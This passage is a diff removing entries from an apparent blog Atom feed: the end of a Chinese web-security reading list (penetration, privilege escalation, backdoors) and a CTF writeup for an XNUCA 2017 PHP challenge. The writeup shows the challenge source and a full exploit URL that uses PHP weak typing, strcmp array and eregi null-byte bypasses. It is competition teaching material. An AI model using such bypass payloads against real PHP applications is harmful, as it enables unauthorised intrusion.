-<li><a href="http://www.freebuf.com/articles/web/141579.html" target="_blank" rel="external">我是如何通过命令执行到最终获取内网Root权限的 </a></li>
-<li><a href="https://xianzhi.aliyun.com/forum/read/1629.html" target="_blank" rel="external">信息收集之SVN源代码社工获取及渗透实战</a></li>
-<li><a href="http://paper.seebug.org/256/" target="_blank" rel="external">SQL注入+XXE+文件遍历漏洞组合拳渗透Deutsche Telekom</a></li>
-<li><a href="http://blog.neargle.com/SecNewsBak/drops/%E6%B8%97%E9%80%8FHacking%20Team%E8%BF%87%E7%A8%8B.html" target="_blank" rel="external">渗透 Hacking Team</a></li>
-<li><a href="https://bbs.ichunqiu.com/thread-25827-1-1.html?from=sec" target="_blank" rel="external">由视频系统SQL注入到服务器权限</a></li>
-<li><a href="http://srcincite.io/blog/2017/05/22/from-serialized-to-shell-auditing-google-web-toolkit-with-el-injection.html" target="_blank" rel="external">From Serialized to Shell :: Exploiting Google Web Toolkit with EL Injection</a></li>
-<li><a href="http://docs.ioin.in/writeup/avfisher.win/_archives_381/index.html" target="_blank" rel="external">浅谈渗透测试实战</a></li>
-<li><a href="http://avfisher.win/archives/741" target="_blank" rel="external">渗透测试学习笔记之案例一</a></li>
-<li><a href="http://avfisher.win/archives/756" target="_blank" rel="external">渗透测试学习笔记之案例二</a></li>
-</ul>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ul>
-<li><a href="http://www.secbox.cn/skill/5583.html" target="_blank" rel="external">提权技巧</a></li>
-<li><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="external">linux-kernel-exploits Linux平台提权漏洞集合</a></li>
-<li><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="external">windows-kernel-exploits Windows平台提权漏洞集合 </a></li>
-<li><a href="http://www.91ri.org/16540.html" target="_blank" rel="external">Linux MySQL Udf 提权</a></li>
-<li><a href="http://mp.weixin.qq.com/s/uOArxXIfcI4fjqnF9BDJGA" target="_blank" rel="external">windows提权系列上篇</a></li>
-<li><a href="https://mp.weixin.qq.com/s/ERXOLhWo0-lJbMV143I8hA" target="_blank" rel="external">Windows提权系列中篇</a></li>
-</ul>
-<h2 id="渗透技巧"><a href="#渗透技巧" class="headerlink" title="渗透技巧"></a>渗透技巧</h2><ul>
-<li><a href="https://mp.weixin.qq.com/s/VqrUTW9z-yi3LqNNy-lE-Q" target="_blank" rel="external">域渗透神器Empire安装和简单使用 </a></li>
-<li><a href="http://www.freebuf.com/news/142195.html" target="_blank" rel="external">如何将简单的Shell转换成为完全交互式的TTY </a></li>
-<li><a href="https://www.n0tr00t.com/2017/03/09/penetration-test-without-file.html" target="_blank" rel="external">60字节 - 无文件渗透测试实验</a></li>
-<li><a href="http://www.tuicool.com/articles/fMFB3mY" target="_blank" rel="external">内网渗透思路探索之新思路的探索与验证</a></li>
-<li><a href="http://www.freebuf.com/articles/web/142628.html" target="_blank" rel="external">Web端口复用正向后门研究实现与防御 </a></li>
-<li><a href="http://docs.ioin.in/writeup/blog.heysec.org/_archives_577/index.html" target="_blank" rel="external">端口渗透总结</a></li>
-<li><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247484812&amp;idx=1&amp;sn=7d894b50b3947142fbfa3a4016f748d5&amp;chksm=ec1e35a4db69bcb2acfe7ecb3b0cd1d366c54bfa1feaafc62c4290b3fd2eddab9aa95a98f041#rd" target="_blank" rel="external">端口扫描那些事</a></li>
-<li><a href="http://blog.neargle.com/SecNewsBak/drops/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E9%80%9A%E8%BF%87cmd%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E7%9A%84N%E7%A7%8D%E6%96%B9%E6%B3%95.html" target="_blank" rel="external">渗透技巧——通过cmd上传文件的N种方法 </a></li>
-<li><a href="http://www.freebuf.com/articles/web/142659.html" target="_blank" rel="external">域渗透TIPS：获取LAPS管理员密码 </a></li>
-<li><a href="http://blog.neargle.com/SecNewsBak/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Security%20Support%20Provider.html" target="_blank" rel="external">域渗透——Security Support Provider</a></li>
-<li><a href="http://docs.ioin.in/writeup/www.91ri.org/_14390_html/index.html" target="_blank" rel="external">内网渗透随想</a></li>
-<li><a href="http://bobao.360.cn/learning/detail/3266.html" target="_blank" rel="external">域渗透之流量劫持</a></li>
-<li><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E7%9A%84%E5%8F%82%E6%95%B0%E9%9A%90%E8%97%8F%E6%8A%80%E5%B7%A7/" target="_blank" rel="external">渗透技巧——快捷方式文件的参数隐藏技巧</a></li>
-<li><a href="https://bbs.ichunqiu.com/thread-25119-1-1.html?from=sec" target="_blank" rel="external">后门整理</a></li>
-<li><a href="https://www.secpulse.com/archives/59674.html" target="_blank" rel="external">Linux后门整理合集（脉搏推荐）</a></li>
-</ul>
-<h2 id="运维"><a href="#运维" class="headerlink" title="运维"></a>运维</h2><ul>
-<li><a href="https://xianzhi.aliyun.com/forum/read/1655.html" target="_blank" rel="external">黑客入侵应急分析手工排查</a></li>
-<li><a href="http://www.mottoin.com/92742.html" target="_blank" rel="external">企业常见服务漏洞检测&amp;修复整理</a></li>
-<li><a href="https://mp.weixin.qq.com/s/0nxiZw1NUoQTjxcd3zl6Zg" target="_blank" rel="external">Linux基线加固</a></li>
-</ul>
-<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="技巧总结"><a href="#技巧总结" class="headerlink" title="技巧总结"></a>技巧总结</h2><ul>
-<li><a href="https://ctf-wiki.github.io/ctf-wiki/#/introduction" target="_blank" rel="external">ctf-wiki</a></li>
-<li><a href="https://www.hackfun.org/CTF/coding-and-encryption-of-those-brain-holes-in-CTF.html" target="_blank" rel="external">CTF中那些脑洞大开的编码和加密</a></li>
-<li><a href="http://thief.one/2017/06/13/1/" target="_blank" rel="external">CTF加密与解密 </a></li>
-<li><a href="https://www.hackfun.org/CTF/summary-of-image-hiding-files-in-CTF.html" target="_blank" rel="external">CTF中图片隐藏文件分离方法总结</a></li>
-<li><a href="http://www.freebuf.com/articles/database/137129.html" target="_blank" rel="external">Md5扩展攻击的原理和应用</a></li>
-<li><a href="http://bobao.360.cn/ctf/detail/203.html" target="_blank" rel="external">CTF比赛中关于zip的总结</a></li>
-<li><a href="http://weibo.com/ttarticle/p/show?id=2309403980950244591011" target="_blank" rel="external">十五个Web狗的CTF出题套路</a></li>
-<li><a href="https://827977014.docs.qq.com/Bt2v7IZWnYo?type=1&amp;_wv=1&amp;_bid=2517" target="_blank" rel="external">CTF备忘录</a></li>
-<li><a href="http://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="external">rcoil:CTF线下攻防赛总结</a></li>
-</ul>
-<h1 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h1><ul>
-<li><a href="http://syean.cn/2017/08/15/%E8%B0%88%E8%B0%88HTML5%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8%E2%80%94%E2%80%94WebStorage/" target="_blank" rel="external">谈谈HTML5本地存储——WebStorage</a></li>
-<li><a href="https://segmentfault.com/p/1210000010668099/read" target="_blank" rel="external">Linux下容易被忽视的那些命令用法</a></li>
-<li><a href="http://www.mottoin.com/94895.html" target="_blank" rel="external">各种脚本语言不同版本一句话开启 HTTP 服务器的总结</a></li>
-<li><a href="http://bobao.360.cn/learning/detail/3757.html" target="_blank" rel="external">WebAssembly入门：将字节码带入Web世界</a></li>
-<li><a href="https://www.leavesongs.com/PENETRATION/phpwind-hash-length-extension-attack.html" target="_blank" rel="external">phpwind 利用哈希长度扩展攻击进行getshell</a></li>
-<li><a href="http://www.freebuf.com/articles/web/69264.html" target="_blank" rel="external">深入理解hash长度扩展攻击（sha1为例） </a></li>
-<li><a href="http://bobao.360.cn/learning/detail/3909.html" target="_blank" rel="external">Joomla 框架的程序执行流程及目录结构分析</a></li>
-<li><a href="http://bobao.360.cn/learning/detail/4268.html" target="_blank" rel="external">如何通过恶意插件在Atom中植入后门</a></li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;Web-Security-Learning 学习资料&lt;br&gt;8月27日更新：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;新增&lt;a href=&quot;https://github.com/CHYbeta/Web-Security-Learning#java-web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1&quot;&gt;java-web代码审计模块&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;整合&lt;a href=&quot;https://github.com/CHYbeta/Web-Security-Learning#php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1&quot;&gt;php代码审计模块&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;新收录文章：&lt;ul&gt;
-&lt;li&gt;XSS；&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;http://blog.rakeshmane.com/2017/08/xssing-web-part-2.html&quot;&gt;Xssing Web With Unicodes&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;http://blog.fr1day.me/2016/09/07/XSS_Tricks_from_selfxss_to_your_account/&quot;&gt;XSS Tricks - 从 Self-XSS 到登录你的账户&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://github.com/wisec/domxsswiki/wiki&quot;&gt;DOMXSS Wiki&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;java-web；&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzIzMzgxOTQ5NA==&amp;amp;mid=100000340&amp;amp;idx=1&amp;amp;sn=6ca4ec15ef6338daf1d4a907351d7c08&amp;amp;chksm=68fe9e5d5f89174b44fd0cae2e3d5c0018859d3d1dc6d60a2e16dcde34499ba224d6ea17a982#rd&quot;&gt;站在Java的视角，深度分析防不胜防的小偷——“XSS” &lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>XNUCA 2017-Web专题赛前指导-php是最好的语言-writeup</title>
-    <link href="http://yoursite.com/2017/08/18/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-php%E6%98%AF%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80-writeup/"/>
-    <id>http://yoursite.com/2017/08/18/XNUCA-2017-Web专题赛前指导-php是最好的语言-writeup/</id>
-    <published>2017-08-18T09:45:39.000Z</published>
-    <updated>2017-08-18T11:41:14.546Z</updated>
-    
-    <content type="html"><![CDATA[<p>php弱类型比较<br>strcmp、eregi<br><a id="more"></a></p>
-<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20114/</div></pre></td></tr></table></figure>
-<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>源代码如下:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">show_source(<span class="keyword">__FILE__</span>);</div><div class="line">$v1=<span class="number">0</span>;$v2=<span class="number">0</span>;$v3=<span class="number">0</span>;</div><div class="line">$a=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'foo'</span>]);</div><div class="line"><span class="keyword">if</span>(is_array($a))&#123;</div><div class="line">   is_numeric(@$a[<span class="string">"bar1"</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">   <span class="keyword">if</span>(@$a[<span class="string">"bar1"</span>])&#123;</div><div class="line">	   ($a[<span class="string">"bar1"</span>]&gt;<span class="number">2016</span>)?$v1=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">   &#125;</div><div class="line">   <span class="keyword">if</span>(is_array(@$a[<span class="string">"bar2"</span>]))&#123;</div><div class="line">	   <span class="keyword">if</span>(count($a[<span class="string">"bar2"</span>])!==<span class="number">5</span> <span class="keyword">OR</span> !is_array($a[<span class="string">"bar2"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"nope"</span>);</div><div class="line">	   $pos = array_search(<span class="string">"nudt"</span>, $a[<span class="string">"a2"</span>]);</div><div class="line">	   $pos===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">	   <span class="keyword">foreach</span>($a[<span class="string">"bar2"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</div><div class="line">		   $val===<span class="string">"nudt"</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">	   &#125;</div><div class="line">	   $v2=<span class="number">1</span>;</div><div class="line">   &#125;</div><div class="line">&#125;</div><div class="line">$c=@$_GET[<span class="string">'cat'</span>];</div><div class="line">$d=@$_GET[<span class="string">'dog'</span>];</div><div class="line"><span class="keyword">if</span>(@$c[<span class="number">1</span>])&#123;</div><div class="line">   <span class="keyword">if</span>(!strcmp($c[<span class="number">1</span>],$d) &amp;&amp; $c[<span class="number">1</span>]!==$d)&#123;</div><div class="line">	   eregi(<span class="string">"3|1|c"</span>,$d.$c[<span class="number">0</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">	   strpos(($c[<span class="number">0</span>].$d), <span class="string">"htctf2016"</span>)?$v3=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">   &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123;</div><div class="line">   <span class="keyword">include</span> <span class="string">"flag.php"</span>;</div><div class="line">   <span class="keyword">echo</span> $flag;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<p>接下来逐步分析。目标是让v1，v2，v3都为 1，这样才能得到flag。</p>
-<h2 id="v1"><a href="#v1" class="headerlink" title="v1"></a>v1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$a=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'foo'</span>]);</div><div class="line"><span class="keyword">if</span>(is_array($a))&#123;</div><div class="line">    is_numeric(@$a[<span class="string">"bar1"</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">    <span class="keyword">if</span>(@$a[<span class="string">"bar1"</span>])&#123;</div><div class="line">        ($a[<span class="string">"bar1"</span>]&gt;<span class="number">2016</span>)?$v1=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">    &#125;</div><div class="line">    ....</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>传入的foo，经过一次json_decode，然后转换成array。然后判断 <code>$a[&quot;bar1&quot;]</code> 是否满足 is_numeric，若满足则die掉。接下来又判断 <code>$a[&quot;bar1&quot;]</code> 是否大于 2016 。</p>
-<p>利用php弱类型特性，可以设置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$a[&quot;bar1&quot;] = 2017a</div></pre></td></tr></table></figure></p>
-<p>这样is_numeric时会判断其为字符串而不是数字，而在与2016的比较中，会直接转换成2017，满足大于2016。这样 v1 就被设置为 1 了。</p>
-<h2 id="v2"><a href="#v2" class="headerlink" title="v2"></a>v2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(is_array(@$a[<span class="string">"bar2"</span>]))&#123;</div><div class="line">	<span class="keyword">if</span>(count($a[<span class="string">"bar2"</span>])!==<span class="number">5</span> <span class="keyword">OR</span> !is_array($a[<span class="string">"bar2"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"nope"</span>);</div><div class="line">	$pos = array_search(<span class="string">"nudt"</span>, $a[<span class="string">"a2"</span>]);</div><div class="line">	$pos===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">	<span class="keyword">foreach</span>($a[<span class="string">"bar2"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</div><div class="line">		$val===<span class="string">"nudt"</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">	&#125;</div><div class="line">	$v2=<span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>接下来，要求<code>$a[&quot;bar2&quot;]</code>是个数组，其中元素的个数为5个（count($a[“bar2”])!==5），同时要求<code>$a[&quot;bar2&quot;][0]</code>是数组。所以我们设置:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$a[&quot;bar2&quot;] = [[],2,3,4,5]</div></pre></td></tr></table></figure></p>
-<p>对于 <code>$pos = array_search(&quot;nudt&quot;, $a[&quot;a2&quot;]);</code>，它搜索字符串“nudt”在$a[“a2”]中的位置。若没有找到，array_search返回false，会通过严格比较导致die掉。所以这里要设置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$a[&quot;a2&quot;] = “nudt”</div></pre></td></tr></table></figure></p>
-<p>注意这里因为用了<code>$pos===false?</code>的严格比较，所以0不<code>===</code>false。</p>
-<p>之后就能设置 v2 = 1</p>
-<p>结合$a是由json_decode得来，所以第一个payload为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">foo=&#123;&quot;bar1&quot;:&quot;2017a&quot;,&quot;bar2&quot;:[[],2,3,4,5],&quot;a2&quot;:[&quot;nudt&quot;]&#125;</div></pre></td></tr></table></figure></p>
-<h2 id="v3"><a href="#v3" class="headerlink" title="v3"></a>v3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$c=@$_GET[<span class="string">'cat'</span>];</div><div class="line">$d=@$_GET[<span class="string">'dog'</span>];</div><div class="line"><span class="keyword">if</span>(@$c[<span class="number">1</span>])&#123;</div><div class="line">   <span class="keyword">if</span>(!strcmp($c[<span class="number">1</span>],$d) &amp;&amp; $c[<span class="number">1</span>]!==$d)&#123;</div><div class="line">	   eregi(<span class="string">"3|1|c"</span>,$d.$c[<span class="number">0</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">	   strpos(($c[<span class="number">0</span>].$d), <span class="string">"htctf2016"</span>)?$v3=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">   &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123;</div><div class="line">   <span class="keyword">include</span> <span class="string">"flag.php"</span>;</div><div class="line">   <span class="keyword">echo</span> $flag;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>先会用strcmp进行比较，利用数组array和字符串进行strcmp比较会返回null，而且数组array也不会等于字符串，我们可以设置cat[1]为一个数组。</p>
-<p>接下来用eregi对拼接后的字符串<code>$d.$c[0]</code>进行正则匹配，若匹配到则die掉。而下一步又要求拼接字符串<code>$c[0].$d</code>中要有字符串“htctf2016”。这里利用%00对eregi的截断功能，则在正则匹配eregi时在开头时就匹配结束掉。</p>
-<p><code>strpos(($c[0].$d), &quot;htctf2016&quot;)</code>中，还要求“htctf2016”不能出现在开头。</p>
-<p>所以设置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$d = %00 即 dog=%00</div><div class="line"></div><div class="line">$c[0]  = &quot;ahtctf2016&quot;</div></pre></td></tr></table></figure></p>
-<p>所以综上所述，构造总的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20114/?foo=&#123;&quot;bar1&quot;:&quot;2017e&quot;,&quot;bar2&quot;:[[],2,3,4,5],&quot;a2&quot;:[&quot;nudt&quot;]&#125;&amp;cat[0]=ahtctf2016&amp;cat[1][]=&amp;dog=%00</div></pre></td></tr></table></figure></p>
-<p>得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php_i5_n0t_b4d</div></pre></td></tr></table></figure></p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>题目已收录进：<a href="https://github.com/CHYbeta/CTF-Web-Challenge/blob/master/php/challenge-2.md" target="_blank" rel="external">CTF-Web-Challenge-php：challenge-2</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;php弱类型比较&lt;br&gt;strcmp、eregi&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
-    
-    
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
-    
-      <category term="web" scheme="http://yoursite.com/tags/web/"/>
     
   </entry>
   
